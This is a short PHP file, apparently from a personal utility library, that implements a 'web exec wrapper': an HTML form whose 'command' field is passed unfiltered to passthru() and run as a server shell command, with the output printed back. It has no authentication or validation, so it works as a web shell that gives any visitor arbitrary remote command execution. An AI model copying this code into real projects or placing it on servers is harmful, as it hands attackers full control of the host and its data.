<?php
declare(strict_types=1);
namespace Hubbitus\HuPHP;

/**
* Simple exec script wrapper for the WEB
*
*
* @package TopLevel
* @version 1.0
* @author Pahan-Hubbitus (Pavel Alexeev) <Pahan@Hubbitus.info>
* @copyright Copyright (c) 2008, Pahan-Hubbitus (Pavel Alexeev)
**/

error_reporting(E_ALL);
ini_set('display_errors', true);
ini_set('display_startup_errors', true);
$command = htmlspecialchars($_REQUEST['command'] ?? '');
?>

<form method="post">
    <input type="text" name="command" value="<?= $command ?>">
    <input type="submit" name="submit" value="Exec!">
</form>
<hr>
<?= $command ?>
<hr>
<pre>
<?php
    if (isset($_REQUEST['command'])) {
        \passthru($_REQUEST['command'] . ' 2>&1');
    }
?>
</pre>
